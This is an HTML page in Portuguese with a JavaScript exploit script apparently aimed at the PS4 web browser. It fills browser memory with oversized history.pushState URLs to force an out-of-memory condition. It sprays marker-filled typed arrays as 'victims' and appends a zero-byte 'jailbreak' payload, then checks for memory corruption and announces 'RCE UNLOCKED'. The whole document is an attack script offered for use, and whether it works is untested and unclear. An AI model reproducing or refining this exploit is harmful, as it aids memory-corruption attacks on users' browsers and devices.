<!DOCTYPE html>
<html>
<head>
    <title>Réplica Fiel (6-3-1) Exploit</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 20px; font-size: 1.3em; cursor: pointer; 
            background: #222; color: #fff; border: 2px solid #00ff00; margin: 10px 0; width: 100%; font-weight: bold;
        }
        .btn:hover { background: #444; }
        .win { background-color: #004400; color: #fff; border: 1px solid #0f0; padding: 5px; }
    </style>
</head>
<body>

<h1>Protocolo Réplica Fiel (6 -> 3 -> 1)</h1>
<p>Recriando a sequência manual exata para forçar o OOM no momento certo.</p>

<button class="btn" onclick="runReplica()">INICIAR SEQUÊNCIA AUTOMÁTICA</button>

<div id="log">Pronto.</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = []; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : '#00ff00';
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    // Payload seguro (Teste 6)
    function makeSafePayload(size) {
        let s = "";
        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
        return s;
    }

    // Payload de Controle (Teste 3)
    function makePatternPayload() {
        let s = "";
        // Repete os bytes do Teste 3
        for(let i=0; i<1000; i++) s += "\x00\x09\x0A\x0D\x20";
        return s;
    }

    async function runReplica() {
        victims = [];
        log("=== INICIANDO RÉPLICA FIEL (6 -> 3 -> 1) ===", 'win');

        // --- PASSO 1: O "TESTE 6" (INCREMENTAL) ---
        // Baseado no seu log: Start 1000, Step 5000, até ~46000
        log("[Fase 1] Teste 6 (Incremental)...");
        
        const START = 1000;
        const END_SAFE = 46000;
        const STEP = 5000;

        for(let size = START; size <= END_SAFE; size += STEP) {
            // 1. History Push (A construção do muro)
            let payload = "/" + "A".repeat(BASE_OFFSET) + makeSafePayload(size);
            history.pushState({}, `T6_${size}`, payload);
            
            // 2. Injeção de Vítima (O Sensor)
            // Colocamos logo após o pushState para ficar adjacente
            let v = new Uint32Array(32);
            v.fill(0x13371337); 
            v.tag = `T6_${size}`;
            victims.push(v);

            log(`    Step: ${size} bytes (OK)`);
            await wait(50);
        }

        // --- PASSO 2: O "TESTE 3" (PADRÕES) ---
        log("[Fase 2] Teste 3 (Padrões Especiais)...");
        await wait(200);

        // Injeta os padrões para "lubrificar" o alinhamento
        for(let i=0; i<20; i++) {
             let payload = "/" + "A".repeat(BASE_OFFSET) + makePatternPayload();
             history.pushState({}, `T3_${i}`, payload);
        }
        log("    Padrões injetados.");

        // --- PASSO 3: O "TESTE 1" (PRESSÃO FINAL + ATAQUE) ---
        log("[Fase 3] Teste 1 Simulado (O Gatilho)...", 'win');
        log("AUMENTANDO CARGA ATÉ O ALERTA DE MEMÓRIA.");
        log(">>> QUANDO O ALERTA APARECER, CLIQUE EM CANCELAR! <<<", 'win');

        await wait(1000);

        // Aqui continuamos o loop do Teste 6, mas agora entrando na zona de perigo (Teste 1)
        // E substituímos o payload seguro pelo ATAQUE (128 Zeros)
        
        let currentSize = END_SAFE + 2000; // Começa onde o T6 parou
        let attackPayload = "\x00".repeat(128); // Nosso payload de Jailbreak
        
        // Loop infinito até o usuário ou o sistema parar
        try {
            while(true) {
                // Preparamos um buffer gigante com o ataque no final
                // O objetivo é fazer este pushState travar o navegador
                let massivePadding = makeSafePayload(currentSize);
                let fullPayload = "/" + "A".repeat(BASE_OFFSET) + massivePadding + attackPayload;

                log(`    Pressão: ${currentSize} bytes + Ataque...`);
                
                // ESTE É O MOMENTO:
                // O navegador vai tentar alocar. Se estiver cheio, vai mostrar o alerta.
                // Se você clicar em Cancelar, ele força a alocação e o GC move tudo.
                // É aí que o overflow acontece.
                history.pushState({}, `T1_ATTACK_${currentSize}`, fullPayload);

                // Se passou daqui, alocamos mais uma vítima para o próximo
                let v = new Uint32Array(32);
                v.fill(0x13371337);
                victims.push(v);

                currentSize += 2000; // Aumenta a pressão
                await wait(10); // Mínimo delay para a UI renderizar
                
                // Checagem de sucesso em tempo real
                if(checkCorruptionQuick()) return;
                
                // Trava de segurança para não travar o PS4 inteiro hard
                if(currentSize > 150000) {
                    log("Limite de segurança atingido. Reinicie se não houve alerta.");
                    break;
                }
            }
        } catch(e) {
            log(`[!] EXCEÇÃO DISPARADA: ${e.message}`, 'win');
            log("Isso significa que o limite foi atingido. Verificando vítimas...", 'win');
            
            // Dá um tempo para o GC assentar após o erro
            await wait(1000);
            checkCorruptionFinal();
        }
    }

    function checkCorruptionQuick() {
        // Checagem rápida nas últimas 5 vítimas
        let start = Math.max(0, victims.length - 5);
        for(let i=start; i<victims.length; i++) {
            if(victims[i][0] !== 0x13371337 || victims[i].length !== 32) {
                log("!!! JACKPOT DETECTADO EM TEMPO REAL !!!", 'win');
                alert("RCE UNLOCKED!");
                return true;
            }
        }
        return false;
    }

    function checkCorruptionFinal() {
        for(let i=0; i<victims.length; i++) {
            let v = victims[i];
            if(v.length !== 32) {
                log(`!!! JACKPOT !!! Vítima ${i} TAMANHO MUDOU: ${v.length}`, 'win');
                alert("RCE UNLOCKED (Size Change)!");
                return;
            }
            if(v[0] !== 0x13371337) {
                log(`!!! JACKPOT !!! Vítima ${i} CONTEÚDO ZERADO!`, 'win');
                alert("RCE UNLOCKED (Zero Content)!");
                return;
            }
        }
        log("[-] Nenhuma corrupção encontrada. Tente novamente clicando em Cancelar mais rápido/devagar.");
    }
</script>
</body>
</html>
